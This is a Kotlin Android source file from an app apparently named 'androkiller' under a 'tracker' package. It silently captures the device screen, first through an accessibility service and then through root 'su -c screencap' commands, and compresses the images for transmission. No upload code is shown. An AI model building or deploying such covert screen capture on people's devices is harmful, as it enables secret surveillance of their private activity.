package com.nexus.androkiller.tracker

import android.content.Context
import android.graphics.Bitmap
import android.util.Log
import com.nexus.androkiller.service.ScreenCaptureAccessibilityService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Robust background screen capture orchestrator supporting:
 * 1. Native Android AccessibilityService (zero root required, silent background).
 * 2. Root/Shell `screencap -p` fallback.
 */
class ScreenCaptureManager(private val context: Context) {

    suspend fun captureScreenshot(): Result<File> = withContext(Dispatchers.IO) {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val outputDir = File(context.cacheDir, "screenshots").apply { if (!exists()) mkdirs() }
        val outputFile = File(outputDir, "screenshot_$timeStamp.jpg")

        // 1. Attempt Native Accessibility Service (clean, unrooted, silent)
        if (ScreenCaptureAccessibilityService.isAvailable) {
            val a11yResult = kotlinx.coroutines.suspendCancellableCoroutine<Result<File>> { cont ->
                ScreenCaptureAccessibilityService.takeScreenshot(
                    onSuccess = { bitmap ->
                        try {
                            FileOutputStream(outputFile).use { out ->
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                            }
                            bitmap.recycle()
                            cont.resumeWith(kotlin.Result.success(Result.success(outputFile)))
                        } catch (e: Exception) {
                            cont.resumeWith(kotlin.Result.success(Result.failure(e)))
                        }
                    },
                    onError = { error ->
                        cont.resumeWith(kotlin.Result.success(Result.failure(Exception(error))))
                    }
                )
            }

            if (a11yResult.isSuccess) {
                Log.i(TAG, "Screenshot captured successfully via AccessibilityService (${outputFile.length()} bytes)")
                return@withContext a11yResult
            } else {
                Log.w(TAG, "Accessibility screenshot attempt failed: ${a11yResult.exceptionOrNull()?.message}. Falling back to shell.")
            }
        }

        // 2. Attempt Root / Shell screencap
        val shellResult = tryShellScreencap(outputFile)
        if (shellResult.isSuccess) {
            Log.i(TAG, "Screenshot captured successfully via shell screencap (${outputFile.length()} bytes)")
            return@withContext shellResult
        }

        Result.failure(
            Exception("Unable to capture screenshot: neither Accessibility Service nor root screencap was available.")
        )
    }

    private fun tryShellScreencap(outputFile: File): Result<File> {
        val tempPng = File(context.cacheDir, "temp_screen_${System.currentTimeMillis()}.png")
        try {
            // Try 'su -c' first, then direct 'screencap'
            val commands = listOf(
                arrayOf("su", "-c", "screencap -p ${tempPng.absolutePath}"),
                arrayOf("/system/bin/screencap", "-p", tempPng.absolutePath)
            )

            for (cmd in commands) {
                try {
                    val process = Runtime.getRuntime().exec(cmd)
                    val exitCode = process.waitFor()
                    if (exitCode == 0 && tempPng.exists() && tempPng.length() > 5000) {
                        // Downsample / compress to JPEG to save bandwidth
                        val bitmap = android.graphics.BitmapFactory.decodeFile(tempPng.absolutePath)
                        if (bitmap != null) {
                            FileOutputStream(outputFile).use { out ->
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                            }
                            bitmap.recycle()
                            tempPng.delete()
                            return Result.success(outputFile)
                        } else {
                            // Use raw PNG if decoding failed
                            tempPng.copyTo(outputFile, overwrite = true)
                            tempPng.delete()
                            return Result.success(outputFile)
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Command failed: ${cmd.joinToString(" ")}: ${e.message}")
                }
            }
            return Result.failure(Exception("Shell screencap execution returned non-zero or empty file"))
        } catch (e: Exception) {
            return Result.failure(e)
        } finally {
            if (tempPng.exists()) tempPng.delete()
        }
    }

    companion object {
        private const val TAG = "ScreenCaptureManager"
    }
}
